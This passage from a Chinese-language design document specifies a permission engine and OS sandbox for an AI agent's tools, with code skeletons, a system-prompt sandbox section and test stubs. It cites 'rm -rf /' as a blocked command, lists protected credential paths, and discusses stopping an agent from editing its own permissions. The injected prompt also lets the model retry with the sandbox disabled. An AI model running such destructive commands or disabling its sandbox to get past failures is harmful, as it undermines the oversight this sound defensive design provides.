        if not self._config.enabled:
            return False
        if not self._is_supported_platform():
            logger.warning("当前平台不支持沙箱(macOS/Linux-WSL2 才支持)")
            return False
        if not self._check_dependencies():
            logger.warning("沙箱依赖缺失(bwrap/ripgrep/socat)")
            return False
        return True

    def initialize(self):
        """对齐 CC initialize — 异步跑,失败 graceful"""
        if self._initialized:
            return
        try:
            # 检查依赖
            deps = self._check_dependencies_detailed()
            if deps["errors"]:
                raise RuntimeError(f"沙箱依赖缺失: {deps['errors']}")
            logger.info(f"✅ 沙箱初始化成功: {deps}")
            self._initialized = True
        except Exception as e:
            logger.error(f"❌ 沙箱初始化失败: {e}")
            if self._config.fail_if_unavailable:
                raise SystemExit(1)  # 对齐 CC failIfUnavailable
            self._initialized = False

    def wrap_with_sandbox(
        self,
        command: str,
        shell_path: str = "/bin/bash",
        working_dir: str = ".",
    ) -> str:
        """
        把 `rm -rf /tmp/foo` 包装成沙箱内可执行命令
        对齐 CC BaseSandboxManager.wrapWithSandbox

        简化:不引入 Node.js 子进程,直接拼 sandbox-runtime CLI 调用
        """
        if not self.is_sandbox_enabled():
            return command  # 不沙箱化,原样返回

        runtime_config = self._build_runtime_config(working_dir)
        config_json = json.dumps(runtime_config)

        # 调用 sandbox-runtime CLI(简化:实际项目里直接调 Node.js 子进程)
        # sandbox-runtime 提供 wrap-cli:
        #   npx @anthropic-ai/sandbox-runtime wrap \
        #     --config <json> -- <cmd>
        # 这里返回拼好的 shell 命令,ToolRegistry.execute 时真正执行
        return (
            f"npx -y @anthropic-ai/sandbox-runtime@latest wrap "
            f"--config {shlex.quote(config_json)} -- "
            f"{shlex.quote(command)}"
        )

    def cleanup_after_command(self):
        """对齐 CC cleanupAfterCommand — 同步清理"""
        if not self.is_sandbox_enabled():
            return
        # bare-git scrub 等(简化:M1 阶段不实现,后续补)
        pass

    def _build_runtime_config(self, working_dir: str) -> dict:
        """对齐 CC convertToSandboxRuntimeConfig"""
        return {
            "filesystem": {
                "allowWrite": [".", self._get_sandbox_tmp_dir()] + self._config.fs_allow_write,
                "denyWrite": self._config.fs_deny_write,
                "allowRead": self._config.fs_allow_read,
                "denyRead": self._config.fs_deny_read,
            },
            "network": {
                "allowedHosts": self._config.network_allowed_domains,
                "deniedHosts": self._config.network_denied_domains,
            },
        }

    def _is_supported_platform(self) -> bool:
        import platform, sys
        if sys.platform == "darwin":
            return True  # macOS Seatbelt 内建
        if sys.platform == "linux":
            # 检查是否在 WSL
            try:
                with open("/proc/version") as f:
                    return "microsoft" in f.read().lower()  # WSL2
            except FileNotFoundError:
                return False
        return False

    def _check_dependencies(self) -> bool:
        # 简化:只检查 bwrap 是否存在
        return shutil.which("bwrap") is not None or sys.platform == "darwin"

    def _check_dependencies_detailed(self) -> dict:
        """对齐 CC checkDependencies — 返回 {errors, warnings}"""
        errors = []
        warnings = []
        if sys.platform == "linux":
            if not shutil.which("bwrap"):
                errors.append("bubblewrap (bwrap) 未安装:apt install bubblewrap")
            if not shutil.which("socat"):
                warnings.append("socat 未安装:网络隔离可能不完整")
        return {"errors": errors, "warnings": warnings}

    def _get_sandbox_tmp_dir(self) -> str:
        """对齐 CC sandboxTmpDir — /tmp/claude-<uid> 0o700"""
        import os, tempfile
        uid = os.getuid()
        tmp = Path(tempfile.gettempdir()) / f"claude-{uid}"
        tmp.mkdir(mode=0o700, exist_ok=True)
        return str(tmp)


# ── 全局单例 ────────────────────────────────────────
sandbox_manager = SandboxManager()
```

### 5.3 工具集成:哪些走沙箱?

| 工具 | 沙箱化? | 原因 |
|------|---------|------|
| `calc` | ❌ 否 | 已有 AST 白名单(强于 OS 沙箱,且无副作用) |
| `search` | ❌ 否 | URL 硬编码(DuckDuckGo)+ 已是只读,无文件操作 |
| `read_file` | ✅ 是 | 文件读必须限制路径,沙箱兜底 |
| `write_file` | ✅ 是 | 文件写必须限制路径 + 网络禁止 |
| `edit_file` | ✅ 是 | 同 write |
| `bash` | ✅ 是 | 任意命令执行,沙箱是唯一可靠兜底 |
| `git_status` / `git_diff` | ✅ 是(可选) | 命令白名单已足够,但加上更稳 |

**判定逻辑**(对齐 CC `shouldUseSandbox`):

```python
# agent_core/tools/tool_sandbox_decision.py
"""
每条 tool_use 是否走沙箱 — 对齐 CC shouldUseSandbox
"""
def should_use_sandbox(tool_name: str, tool_input: dict) -> bool:
    if not sandbox_manager.is_sandbox_enabled():
        return False
    if tool_input.get("dangerously_disable_sandbox"):
        if sandbox_manager._config.allow_unsandboxed_commands:
            return False  # 模型主动绕过 + 用户允许
    if tool_name not in ("Bash", "Read", "Write", "Edit"):
        return False  # calc/search 不需要沙箱
    if _is_excluded_command(tool_name, tool_input):
        return False  # 用户排除
    return True


def _is_excluded_command(tool_name: str, tool_input: dict) -> bool:
    """对齐 CC containsExcludedCommand — UX 而非安全"""
    if tool_name != "Bash":
        return False
    cmd = tool_input.get("command", "")
    for pattern in sandbox_manager._config.excluded_commands:
        if pattern in cmd:
            return True
    return False
```

### 5.4 Prompt 注入:告诉 LLM 边界

**对齐 CC `BashTool/prompt.ts`** —— 在 system prompt 里告诉模型沙箱规则:

```python
# agent_core/tools/sandbox_prompt.py
"""
注入沙箱规则到 system prompt
对齐 Claude Code src/tools/BashTool/prompt.ts getSimpleSandboxSection
"""
def get_sandbox_prompt_section() -> str:
    if not sandbox_manager.is_sandbox_enabled():
        return ""

    cfg = sandbox_manager._config
    return f"""
## Command sandbox
Your command will be run in a sandbox. The sandbox controls which directories
and network hosts commands may access.

Filesystem:
- Write allowed: {cfg.fs_allow_write or ['. (cwd)', '/tmp/claude-<uid>']}
- Write denied:  {cfg.fs_deny_write or []}
- Read denied:   {cfg.fs_deny_read or []}

Network:
- Allowed hosts: {cfg.network_allowed_domains or []}
- Denied hosts:  {cfg.network_denied_domains or []}

- Always default to running commands within the sandbox.
- For temporary files, use $TMPDIR (automatically set to sandbox tmp dir).
- Do NOT use `/tmp` directly — use `$TMPDIR` instead.
- If sandbox causes failures ("Operation not permitted", network denied, etc.),
  retry with `dangerously_disable_sandbox: true` (only if allow_unsandboxed_commands).
- Do not suggest adding sensitive paths (~/.ssh, ~/.bashrc) to the allowlist.
"""
```

---

## 6. 关键交互点 — 两层协同

### 6.1 调用流程

对齐 CC `toolExecution.ts:runToolUse` 的决策链:

```
LLM 产出 tool_use(name, input)
    │
    ▼
[1] ReactAgent.run() 收到 tool_use
    │
    ▼
[2] PermissionEngine.check_permissions(tool, input)   ← 应用层
    │   ├─ DENY → 发 tool_result error 给 LLM,跳过
    │   ├─ ASK  → 弹 Streamlit PermissionDialog
    │   │         - 用户选择:allow / deny / "always allow"
    │   │         - 选择 persist → 更新 settings.json
    │   └─ ALLOW → 继续
    │
    ▼
[3] HookRegistry.run_pre_tool_use(tool, input)       ← Hook 层
    │   ├─ 任一 hook DENY → skip + tool_result error
    │   ├─ Hook 改 input → 用 merged_input 继续
    │   └─ 无操作 → 原 input 继续
    │
    ▼
[4] ToolRegistry.execute(tool, input, ...)            ← 执行层
    │   ├─ schema 校验 (新增):input 不符 parameters → error
    │   ├─ should_use_sandbox(tool, input)?
    │   │   ├─ True → SandboxManager.wrap_with_sandbox(cmd)
    │   │   │         → 实际执行 sandbox 化的命令
    │   │   └─ False → 直接执行
    │   ├─ ThreadPoolExecutor + future.result(timeout)
    │   └─ 返回 {status, output} 或 {status, error}
    │
    ▼
[5] 构造 tool_result block 喂回 LLM
```

### 6.2 与现有代码的整合点

| 现有代码 | 改造点 |
|---------|--------|
| `[agent_core/agent_core.py:868](agent_core/agent_core.py#L868)` `self.tools.execute(...)` | **插入 PermissionEngine.check_permissions** 在 execute 之前 |
| `[agent_core/agent_core.py:861-948](agent_core/agent_core.py#L861-L948)` 单/并行执行分支 | **插入 should_use_sandbox 判断**,为 BashTool 加 wrap |
| `[agent_core/tools/base.py:77](agent_core/tools/base.py#L77)` ToolRegistry.execute | **新增 schema 校验**(用 jsonschema 库) |
| `[agent_core/tools/base.py:11](agent_core/tools/base.py#L11)` ToolDef | **新增可选字段**: `check_permissions: Optional[Callable]` |
| `[agent_core/tools/builtin.py](agent_core/tools/builtin.py)` | calc/search 保持不变;后续加 Read/Write/Bash 时按 §4.5 模式 |
| `[web/app.py](web/app.py)` | Streamlit sidebar 加 Permission 面板 + 弹窗 |

### 6.3 BashTool + Sandbox auto-allow

**对齐 CC `bashPermissions.ts:1829 checkSandboxAutoAllow`** —— 关键协同点:

```python
def bash_check_permissions_with_sandbox(
    tool_input: dict, context: ToolPermissionContext,
) -> PermissionDecision:
    # 1. 先走应用层规则(deny/ask rule 永远生效)
    base = bash_check_permissions(tool_input, context)
    if base.behavior in (PermissionBehavior.DENY, PermissionBehavior.ASK):
        return base

    # 2. 沙箱开启 + auto_allow_bash_if_sandboxed → 沙箱内命令自动放行
    if (sandbox_manager.is_sandbox_enabled()
            and sandbox_manager._config.auto_allow_bash_if_sandboxed
            and should_use_sandbox("Bash", tool_input)):
        return PermissionDecision(
            behavior=PermissionBehavior.ALLOW,
            decision_reason=PermissionDecisionReason(
                type="other",
                reason="Auto-allowed in sandbox; deny rules already checked",
            ),
        )

    return base
```

**安全保证**:
- ✅ 即便 auto-allow,**deny 规则仍生效**(防止 `Bash(rm:*)` 被绕过)
- ✅ 即便沙箱被绕过,**deny 规则仍生效**
- 两层都失守才可能误放 → 概率极低

---

## 7. 代码实现路径

### 7.1 新增文件清单

```
agent_core/tools/
├── __init__.py                    (更新导出)
├── base.py                        (142 → 220 行:加 schema 校验 + hook + check_permissions 字段)
├── builtin.py                     (149 行不变 + 后续加 Read/Write/Bash)
├── permission_types.py            (新增 ~120 行:枚举 + dataclass + Pydantic)
├── permission_matcher.py          (新增 ~80 行:rule 解析 + match)
├── permission_engine.py           (新增 ~180 行:7 步决策引擎)
├── permission_loader.py           (新增 ~70 行:从 settings.json 加载)
├── permission_hook.py             (新增 ~120 行:Hook 注册 + 预置 hook)
├── bash_permissions.py            (新增 ~150 行:Bash 工具专属)
├── safety_check.py                (新增 ~60 行:敏感路径检测)
├── sandbox_manager.py             (新增 ~150 行:sandbox-runtime 适配)
├── sandbox_decision.py            (新增 ~50 行:should_use_sandbox)
├── sandbox_prompt.py              (新增 ~60 行:prompt 注入)
└── audit_logger.py                (新增 ~80 行:独立审计通道)

docs/tool/
├── tool-security-architecture.md  (本文档,新增)
```

### 7.2 关键代码骨架

#### Base 改造:`ToolDef.check_permissions` + `ToolRegistry.execute` 加 schema 校验

```python
# agent_core/tools/base.py (改造)
from dataclasses import dataclass, field
from typing import Any, Callable, Optional
import jsonschema  # 新增依赖


@dataclass
class ToolDef:
    name: str
    description: str
    parameters: dict
    handler: Callable
    # 🆕 新增
    category: str = "general"        # UI 分类用
    version: str = "1.0"
    deprecated_since: Optional[str] = None
    check_permissions: Optional[Callable] = None  # (input, context) -> PermissionDecision


class ToolRegistry:
    def execute(self, tool_name, tool_input, max_retries=3, timeout=10.0):
        tool_def = self._tools.get(tool_name)
        if not tool_def:
            return {"status": "error", "error": f"未找到工具: {tool_name}"}

        # 🆕 schema 校验
        try:
            jsonschema.validate(instance=tool_input, schema=tool_def.parameters)
        except jsonschema.ValidationError as e:
            return {"status": "error", "error": f"参数校验失败: {e.message}"}

        # 🆕 deprecation warning
        if tool_def.deprecated_since:
            logger.warning(f"⚠️ 工具 {tool_name} 自 {tool_def.deprecated_since} 已弃用")

        # ... 原有超时 + 重试逻辑不变 ...
```

#### ReactAgent 整合:`run()` 在 execute 前过 PermissionEngine

```python
# agent_core/agent_core.py (改造 line ~860)
# 在 self.tools.execute 前:
from .tools.permission_engine import PermissionEngine
from .tools.permission_loader import load_tool_permission_context
from .tools.sandbox_decision import should_use_sandbox

# Agent 初始化时加载 context
self._permission_ctx = load_tool_permission_context()
self._permission_engine = PermissionEngine(self._permission_ctx)

# tool 执行前
async def _run_tool_with_permission(self, tool: ToolDef, tool_input: dict):
    decision = self._permission_engine.check_permissions(tool, tool_input)

    if decision.behavior == PermissionBehavior.DENY:
        return {"status": "error", "error": f"Permission denied: {decision.decision_reason.reason}"}

    if decision.behavior == PermissionBehavior.ASK:
        # 弹 Streamlit 弹窗,等用户选择
        user_choice = await self._ask_user_permission(tool, tool_input, decision)
        if user_choice == "deny":
            return {"status": "error", "error": "Permission denied by user"}

    # hook 链
    hook_result = self._hook_registry.run_pre_tool_use(tool.name, tool_input)
    if hook_result.decision == PermissionBehavior.DENY:
        return {"status": "error", "error": f"Hook denied: {hook_result.additional_context}"}
    tool_input = hook_result.updated_input or tool_input

    # 沙箱包装
    if tool.name == "Bash" and should_use_sandbox(tool.name, tool_input):
        tool_input["command"] = sandbox_manager.wrap_with_sandbox(tool_input["command"])

    # 实际执行
    return self.tools.execute(tool.name, tool_input, max_retries=3)
```

### 7.3 测试覆盖

```python
# tests/test_permission_engine.py (新增)
class TestPermissionEngine:
    def test_global_deny_rule_blocks_immediately(self): ...
    def test_global_ask_rule_prompts_user(self): ...
    def test_bypass_mode_skips_ask_but_respects_deny(self): ...
    def test_safety_check_blocks_sensitive_paths(self): ...
    def test_tool_specific_check_permissions_called(self): ...

class TestBashPermissions:
    def test_split_command_handles_and_operator(self): ...
    def test_strip_safe_wrappers(self): ...
    def test_cd_plus_git_asks_user(self): ...
    def test_max_subcommands_50_prompts(self): ...
    def test_subcommand_deny_blocks_whole_command(self): ...

class TestSandbox:
    def test_disabled_by_default(self): ...
    def test_unsupported_platform_returns_false(self): ...
    def test_wrap_with_sandbox_adds_runtime_prefix(self): ...
    def test_calc_does_not_use_sandbox(self): ...
    def test_bash_uses_sandbox_when_enabled(self): ...

class TestHookChain:
    def test_pre_tool_use_can_deny(self): ...
    def test_pre_tool_use_can_update_input(self): ...
    def test_hooks_run_in_order(self): ...
    def test_hook_exception_is_logged_not_raised(self): ...

class TestSafetyCheck:
    def test_sensitive_settings_json_blocked(self): ...
    def test_ssh_dir_blocked(self): ...
    def test_project_git_config_blocked(self): ...
```

---

## 8. 与 Claude Code 的对齐对照表

| 维度 | Claude Code | 本项目目标 | 偏离度 |
|------|------------|-----------|--------|
| **Permission 引擎** | `permissions.ts:1486` 行 + 11K 行 | `permission_engine.py` ~180 行 | **95% 简化** |
| **Bash 权限** | `bashPermissions.ts:2621` 行 + tree-sitter AST | `bash_permissions.py` ~150 行 + shlex.split | **90% 简化** |
| **Sandbox 适配** | `sandbox-adapter.ts:985` 行 | `sandbox_manager.py` ~150 行 | **85% 简化** |
| **Sandbox 底层** | `@anthropic-ai/sandbox-runtime` (npm) | **复用同款**(Python subprocess) | **0% 偏离** |
| **Permission 来源数** | 8 source | 4 source (POLICY/FLAG/PROJECT/LOCAL) | **简化** |
| **Permission mode** | 5 (default/acceptEdits/bypass/dontAsk/plan/auto) | 5 (去掉 auto,加 plan) | **简化** |
| **Hook 系统** | PreToolUse/PermissionRequest/PermissionDenied | PreToolUse/PermissionRequest | **简化** |
| **Classifier (Haiku YOLO)** | 有 | ❌ M1 不做 | **不做** |
| **Plan mode** | 有 | ⚠️ M2 考虑 | **不做 M1** |
| **UI 弹窗** | React/Ink TUI + 多个 subcomponent | Streamlit dialog (1 个组件) | **简化** |
| **Settings 文件位置** | `~/.claude/settings.json` + `.claude/settings.json` | `~/.agent_data/settings.json` + `.agent_data/settings.json` | **路径对齐** |
| **Settings schema** | Zod | Pydantic | **等价** |
| **`excludedCommands` 语义** | UX 而非安全 | 同 | **完全对齐** |
| **`dangerouslyDisableSandbox`** | 有 | 有(M2) | **延迟** |
| **auto-allow + sandbox** | bashPermissions.ts:1829 | bash_permissions.py:bash_check_permissions_with_sandbox | **完全对齐** |
| **sensitivity check** | `.claude/` `.git/` 等 | `.agent_data/` `.git/` `.ssh/` 等 | **路径替换** |
| **fail_if_unavailable** | 有 | 有 | **对齐** |
| **bare-git scrub** | 有 | ⚠️ M2 简化版 | **简化** |
| **audit log** | session.jsonl + telemetry | session.jsonl + audit_logger.py 独立 | **加强**(拆出独立通道) |

---

## 9. 实施顺序 + 工作量估算

按"最小可用 + 渐进增强"原则,分 3 阶段:

### Phase 1 (M1, ~3 天) — 应用层基础

**目标**:有规则,有 decision engine,有 UI 弹窗。**无沙箱**。

| Task | 文件 | 工时 |
|------|------|------|
| 1. `permission_types.py` | 新增 | 2h |
| 2. `permission_matcher.py` | 新增 | 1h |
| 3. `permission_engine.py` | 新增 | 3h |
| 4. `permission_loader.py` | 新增 | 1h |
| 5. `safety_check.py` | 新增 | 1h |
| 6. `permission_hook.py` (基础) | 新增 | 2h |
| 7. `base.py` 改造 (加 check_permissions / schema 校验) | 改 | 1h |
| 8. `agent_core.py` 整合 (PermissionEngine) | 改 | 2h |
| 9. `web/app.py` Streamlit 弹窗 | 改 | 2h |
| 10. 测试 | 新增 | 4h |

**里程碑**:能给 Read/Write 工具加 deny rule,跑起来看到弹窗。

### Phase 2 (M2, ~3 天) — OS 层沙箱 + Bash 工具

**目标**:加 BashTool + Sandbox 兜底,实现 auto-allow 协同。

| Task | 文件 | 工时 |
|------|------|------|
| 1. `sandbox_manager.py` | 新增 | 4h |
| 2. `sandbox_decision.py` | 新增 | 1h |
| 3. `sandbox_prompt.py` | 新增 | 1h |
| 4. `bash_permissions.py` | 新增 | 4h |
| 5. BashTool 内置实现 | 新增 | 2h |
| 6. `audit_logger.py` | 新增 | 2h |
| 7. `agent_core.py` 整合 (sandbox wrap) | 改 | 2h |
| 8. 测试 + 集成测试 | 新增 | 4h |

**里程碑**:LLM 调 `bash("rm -rf /")` → 应用层 deny → 不会真正执行;LLM 调 `bash("npm install")` → 沙箱允许 + audit log 记录。

### Phase 3 (M3, ~2 天) — 增强

**目标**:补 classifier(可选)、bare-git scrub、Streamlit 规则编辑器 UI。

| Task | 文件 | 工时 |
|------|------|------|
| 1. `classifierDecision.py` (safe-tool allowlist) | 新增 | 2h |
| 2. Plan mode + AcceptEdits mode | 改 | 4h |
| 3. Streamlit `/permissions` 面板 (编辑 rules) | 新增 | 4h |
| 4. E2E 测试 + 性能测试 | 新增 | 4h |

---

## 附录 A — 与 SM/记忆系统的关系

> 这是用户常问的一个边界问题:**记忆持久化绕开 ToolRegistry**(用直接 IO),现在加了 Permission/Sandbox 后,边界是什么?

| 操作 | 走 Tool 路径? | 走 Permission? | 走 Sandbox? |
|------|--------------|---------------|-----------|
| `~/.agent_data/memory/*.md` 读写 | ❌(直接 IO) | ❌(BashTool 才能触发,LMM 调不到) | ❌ |
| `data/sessions/*.jsonl` 写 | ❌(直接 IO) | ❌ | ❌ |
| LLM 调 `read_file("~/.agent_data/...")` | ✅(如果加此工具) | ✅ | ✅(deny) |
| LLM 调 `bash("cat ~/.agent_data/...")` | ✅ | ✅ | ✅(deny) |

**铁律**:`.agent_data/` 必须永远在 sandbox `denyRead/denyWrite` 列表里 —— 即便加了 `read_file` 工具也不能读自己的 settings。这是**防止沙箱逃逸**(LLM 改自己权限)的关键防御。

---

## 附录 B — 参考资料

- Claude Code 工具权限设计:`docs/tool/permission-design.md`
- Claude Code 沙箱实现:`docs/tool/sandbox-implementation.md`
- Claude Code 源码:`/Users/fanyunxu/Desktop/myproject/ailearning/claude-code-analysis/src/`
  - `utils/permissions/permissions.ts` (1486 行)
  - `utils/permissions/bashClassifier.ts` (61 行,external stub)
  - `tools/BashTool/bashPermissions.ts` (2621 行)
  - `utils/sandbox/sandbox-adapter.ts` (985 行)
  - `entrypoints/sandboxTypes.ts` (156 行 Zod schema)
- 当前项目工具现状:`agent_core/tools/base.py` + `builtin.py`

---

> 本文档为**架构设计 + 代码骨架**,不包含完整实现。Phase 1/2/3 的实施任务见 §9。